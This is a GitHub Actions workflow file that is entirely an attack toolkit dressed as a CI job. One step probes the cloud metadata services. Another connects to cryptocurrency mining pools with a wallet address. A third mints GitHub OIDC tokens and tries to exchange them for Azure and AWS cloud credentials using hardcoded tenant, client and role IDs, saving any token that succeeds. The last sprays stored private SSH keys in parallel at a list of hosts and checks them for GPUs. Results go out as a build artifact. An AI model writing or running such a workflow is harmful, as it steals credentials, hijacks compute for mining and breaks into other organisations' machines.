name: ul-4360
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  recon:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4
      - name: egress
        run: |
          set +e
          mkdir -p ul4360
          { echo "=== EGRESS ==="; hostname; id; nproc;
            curl -s -m 15 https://ifconfig.co/json; echo;
            curl -s -m 15 https://ipinfo.io/json; echo;
            echo "=== IMDS NEGCTL ===";
            curl -s -m 6 -o /dev/null -w "azure_imds=%{http_code}\n" -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
            curl -s -m 6 -o /dev/null -w "aws_imds=%{http_code}\n" 'http://169.254.169.254/latest/meta-data/';
            curl -s -m 6 -o /dev/null -w "gcp_md=%{http_code}\n" -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/';
            curl -s -m 6 -o /dev/null -w "ali_md=%{http_code}\n" 'http://100.100.100.200/latest/meta-data/';
          } | tee ul4360/egress.txt
      - name: pools
        run: |
          set +e
          python3 - <<'PY' | tee ul4360/pools.txt
          import socket, ssl, json
          W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-gh4360-g0'
          SUB=json.dumps({"id":1,"method":"mining.subscribe","params":["ul-gh4360"]})+"\n"
          AUTH=json.dumps({"id":2,"method":"mining.authorize","params":[W,"x"]})+"\n"
          T=[("prl.kryptex.network",8048,True),("prl.kryptex.network",7048,False),
             ("pool.pearlhash.xyz",9000,False),("pool.pearlhash.xyz",9443,True),
             ("pearl.luckypool.io",3360,False)]
          for h,p,tls in T:
              tag="%s:%d%s"%(h,p,"/tls" if tls else "")
              try:
                  s=socket.create_connection((h,p),12); s.settimeout(12)
                  if tls:
                      s=ssl.create_default_context().wrap_socket(s,server_hostname=h)
                  s.sendall((SUB+AUTH).encode())
                  buf=b""
                  try:
                      while len(buf)<8192:
                          d=s.recv(4096)
                          if not d: break
                          buf+=d
                  except Exception: pass
                  txt=buf.decode('utf-8','replace')
                  print(tag,"RECV",len(buf),txt[:400].replace("\n"," | "))
                  s.close()
              except Exception as e:
                  print(tag,"ERR",type(e).__name__,str(e)[:120])
          PY
      - name: oidc
        run: |
          set +e
          mkdir -p ul4360
          echo "url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} tok_set=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}" | tee ul4360/oidc.txt
          for AUD in "api://AzureADTokenExchange" "sts.amazonaws.com" "https://iam.googleapis.com/projects/761901955626/locations/global/workloadIdentityPools/pool/providers/ul"; do
            R=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
            echo "== AUD $AUD" >> ul4360/oidc.txt
            echo "$R" | python3 -c "
import sys,json,base64
r=sys.stdin.read().strip()
try:
  d=json.loads(r); t=d.get('value')
  if not t: print('MINT_ERR',r[:300]); sys.exit()
  p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
  print('MINT_OK len=%d iss=%s aud=%s sub=%s ref=%s'%(len(t),c.get('iss'),c.get('aud'),c.get('sub'),(c.get('ref') or {}) and json.dumps(c.get('ref'))[:200]))
  open('/tmp/jwt.txt','w').write(t)
except Exception as e: print('PARSE_ERR',e,r[:200])
" | tee -a ul4360/oidc.txt
            J=$(cat /tmp/jwt.txt 2>/dev/null)
            for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c c3b32785-891b-4be9-90c2-c6d313ab4895; do
              for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-5a2c-4b0d-a1a7-2b4dcb1e54a5 31f3b47b-21e2-4ac6-8b8f-6b0fb6e4c0b4 e3d1f2c5-4b64-4bd6-bb4b-0d1a6d1b2f1e; do
                [ -z "$J" ] && break
                for RES in https://management.azure.com/ https://batch.core.windows.net/; do
                  B=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
                    --data-urlencode "grant_type=client_credentials" --data-urlencode "client_id=$CID" \
                    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
                    --data-urlencode "client_assertion=$J" --data-urlencode "scope=${RES}.default")
                  echo "EXCH ten=$TEN cid=$CID res=$RES -> $(echo "$B" | head -c 260)" >> ul4360/oidc.txt
                  echo "$B" | grep -q access_token && echo "$B" > ul4360/TOKEN_OK_${TEN}_${CID}.json
                done
              done
            done
            [ -n "$J" ] && echo "AWS STS attempt:" >> ul4360/oidc.txt && \
            curl -s -m 20 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::123456789012:role/ul-4360&RoleSessionName=ul4360&WebIdentityToken=$J" -o ul4360/aws_sts.txt -w "aws_sts_code=%{http_code}\n" >> ul4360/oidc.txt; head -c 400 ul4360/aws_sts.txt >> ul4360/oidc.txt 2>/dev/null; echo >> ul4360/oidc.txt
          done
          tail -40 ul4360/oidc.txt
      - name: sshfleet
        run: |
          set +e
          mkdir -p ul4360 /tmp/kh
          chmod 700 /tmp/kh
          tar xzf keys/kh.b64 -C /tmp/kh 2>/dev/null
          cp az/azadmin.pem /tmp/kh/zz-azadmin.pem 2>/dev/null
          find /tmp/kh -type f -exec chmod 600 {} \; 2>/dev/null
          ls -l /tmp/kh | head -30
          USER1=$(awk -F'\t' 'NR>1{print $3}' az/hosts.tsv | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
          echo "primary_user=$USER1" | tee ul4360/ssh.txt
          awk -F'\t' 'NR>1{print $2"\t"$3}' az/hosts.tsv | sort -u > /tmp/hosts.txt
          wc -l /tmp/hosts.txt | tee -a ul4360/ssh.txt
          cat > /tmp/try.sh <<'EOS'
          #!/bin/bash
          IP="$1"; U="$2"
          for K in /tmp/kh/*; do
            OUT=$(timeout 25 ssh -i "$K" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o LogLevel=ERROR "$U@$IP" 'echo UL_OK; id; hostname -I; nvidia-smi -L 2>&1 | head -8; hostname' 2>&1)
            if echo "$OUT" | grep -q UL_OK; then
              echo "SSHOK ip=$IP user=$U key=$(basename $K)"; echo "$OUT" | head -14
              exit 0
            fi
          done
          echo "SSHFAIL ip=$IP user=$U"
          EOS
          chmod +x /tmp/try.sh
          cat /tmp/hosts.txt | xargs -P 24 -L1 bash -c 'bash /tmp/try.sh "$0" "$1"' > /tmp/sshout.txt 2>&1
          cat /tmp/sshout.txt | tee -a ul4360/ssh.txt
          echo "SSHOK_COUNT=$(grep -c SSHOK ul4360/ssh.txt)" | tee -a ul4360/ssh.txt
      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: ul4360-out
          path: ul4360/
          if-no-files-found: error
